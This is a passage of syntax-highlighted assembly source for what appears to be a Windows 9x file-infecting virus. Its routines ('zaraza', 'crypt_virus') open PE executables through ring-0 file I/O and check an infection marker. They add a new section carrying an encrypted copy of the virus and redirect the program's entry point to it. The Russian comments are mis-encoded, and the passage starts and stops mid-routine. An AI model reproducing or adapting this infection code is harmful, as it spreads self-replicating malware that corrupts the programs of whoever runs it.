        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">time_date_of_file</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">cell_for_rnd_number</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">no_open_file</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popfd</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">extention</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filename</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">filemask</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_zaraza</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG_INT1</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1h</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3ch</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc1">;—¨â ¥¬ PE § £®«®¢®ª</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header_entrypoint</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc2">01010004h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc2">01010004h</span><span class="sc0">
        </span><span class="sc1">;—¨â ¥¬ ¯®á«¥¤­¨© ®¡ì¥ªâ</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;—¨á«® ®¡ì¥ªâ®¢</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">       </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;+NT Header SIZE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header_entrypoint</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ_entrypoint</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_WIN_object</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_WIN_object</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">'_piz'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc1">;H áâp ¨¢ ¥¬ ­®¢ë© ®¡ì¥ªâ</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">length_of_virus</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;FILE ALIGN</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;VIRTUAL SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;PHYS SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_WIN_object</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;RVA ¯®á«¥¤­¥£® ®¡ì¥ªâ </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_WIN_object</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;VIRTUAL SIZE</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;Object ALIGN</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">       </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">;OBJECT RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_handle</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">VXDCall_IFSMgr_Ring0_FileIO</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;„«¨­­  ä ©« </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">common_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;FILE ALIGN</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">;PHYS OFFSET</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">      </span><span class="sc5">exit_zaraza</span><span class="sc0">
        </span><span class="sc6">jcxz</span><span class="sc0">     </span><span class="sc5">no_add_nul</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">clear_NUL_buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
</span><span class="sc5">no_add_nul</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;H áâp ¨¢ ¥¬ PE header</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc1">;‘®åp ­ï¥¬ áâ pë© RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;IMAGE BASE</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;ENTRYPOINT RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">programm_RVA_with_IMAGEBASE</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc1">;‘â ¢¨¬ ­ è RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;RVA ­®¢®£® ®¡ì¥ªâ </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;NEW RVA ENTRYPOINT</span><span class="sc0">
        </span><span class="sc1">;¥¤ ªâ¨pã¥¬ IMAGE SIZE</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;VIRTUAL SIZE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;OBJECT ALIGN</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;IMAGE SIZE</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬ ¢¨pãá</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">crypt_virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">length_of_virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;FHYS OFFSET</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc1">;„®¯¨áë¢ ¥¬ ­¥¤®áâ îé¥¥</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">length_of_virus</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc5">length_of_virus</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">clear_NUL_buffer</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬ ­®¢ë© PE_header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">60h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header_entrypoint</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_header</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
        </span><span class="sc1">;¨è¥¬ ­®¢ë© OBJ</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ_entrypoint</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_OBJ</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">write_to_file</span><span class="sc0">
</span><span class="sc5">exit_zaraza</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">clear_NUL_buffer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2000h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NUL_buffer</span><span class="sc4">-</span><span class="sc5">obr_IFSAPI</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">      </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">crypt_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">length_of_virus</span><span class="sc0">
